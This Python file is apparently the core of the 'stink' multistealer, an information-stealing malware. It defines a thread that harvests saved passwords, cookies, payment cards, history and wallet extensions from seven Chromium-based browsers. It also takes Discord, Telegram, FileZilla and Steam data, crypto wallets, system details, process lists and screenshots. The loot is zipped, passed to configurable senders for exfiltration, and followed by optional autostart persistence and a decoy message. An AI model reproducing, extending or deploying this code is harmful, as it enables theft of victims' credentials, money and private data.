from sys import argv
from time import sleep
from typing import List
from threading import Thread
from multiprocessing import Pool

from stink.enums import Features, Utils
from stink.utils import Autostart, Message
from stink.helpers import functions, MemoryStorage
from stink.helpers.config import MultistealerConfig, Browsers
from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets


class Stealer(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(self, senders: List = None, features: List = None, utils: List = None, delay: int = 0):
        Thread.__init__(self, name="Stealer")

        if utils is None:
            utils = []

        if senders is None:
            senders = []

        if features is None:
            features = [Features.all]

        self.__senders = senders
        self.__autostart = True if Utils.autostart in utils else False
        self.__message = True if Utils.message in utils else False
        self.__delay = delay

        self.__config = MultistealerConfig()
        self.__storage = MemoryStorage()

        browser_functions = [module for module in [
            Features.passwords,
            Features.cookies,
            Features.cards,
            Features.history,
            Features.bookmarks,
            Features.extensions,
            Features.wallets
        ] if module in features or Features.all in features]
        browser_statuses = True if len(browser_functions) > 0 else False

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.ChromePaths[0],
                    self.__config.ChromePaths[1],
                    self.__config.ChromePaths[2],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.OperaGXPaths[0],
                    self.__config.OperaGXPaths[1],
                    self.__config.OperaGXPaths[2],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.OperaDefaultPaths[0],
                    self.__config.OperaDefaultPaths[1],
                    self.__config.OperaDefaultPaths[2],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.MicrosoftEdgePaths[0],
                    self.__config.MicrosoftEdgePaths[1],
                    self.__config.MicrosoftEdgePaths[2],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.BRAVE.value,
                    self.__config.BravePaths[0],
                    self.__config.BravePaths[1],
                    self.__config.BravePaths[2],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.VIVALDI.value,
                    self.__config.VivaldiPaths[0],
                    self.__config.VivaldiPaths[1],
                    self.__config.VivaldiPaths[2],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.YandexPaths[0],
                    self.__config.YandexPaths[1],
                    self.__config.YandexPaths[2],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": System,
                "arguments": (
                    "System",
                ),
                "status": True if (Features.system in features or Features.all in features) else False
            },
            {
                "object": Processes,
                "arguments": (
                    "System",
                ),
                "status": True if (Features.processes in features or Features.all in features) else False
            },
            {
                "object": Screenshot,
                "arguments": (
                    "System",
                ),
                "status": True if (Features.screenshot in features or Features.all in features) else False
            },
            {
                "object": Discord,
                "arguments": (
                    "Programs/Discord",
                ),
                "status": True if (Features.discord in features or Features.all in features) else False
            },
            {
                "object": Telegram,
                "arguments": (
                    "Programs/Telegram",
                ),
                "status": True if (Features.telegram in features or Features.all in features) else False
            },
            {
                "object": FileZilla,
                "arguments": (
                    "Programs/FileZilla",
                ),
                "status": True if (Features.filezilla in features or Features.all in features) else False
            },
            {
                "object": Steam,
                "arguments": (
                    "Programs/Steam",
                ),
                "status": True if (Features.steam in features or Features.all in features) else False
            },
            {
                "object": Wallets,
                "arguments": (
                    "Wallets",
                ),
                "status": True if (Features.wallets in features or Features.all in features) else False
            }
        ]

    def run(self) -> None:
        """
        Launches the Stink.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            sleep(self.__delay)

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(functions.run_process, [
                    (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                ])
            pool.close()

            data = self.__storage.create_zip([item for sublist in results for item in sublist])

            for sender in self.__senders:
                sender.run(self.__config.ZipName, data)

            if self.__autostart is True:
                Autostart(argv[0]).run()

            if self.__message is True:
                Message().run()

        except Exception as e:
            print(f"[Multi stealer]: {repr(e)}")
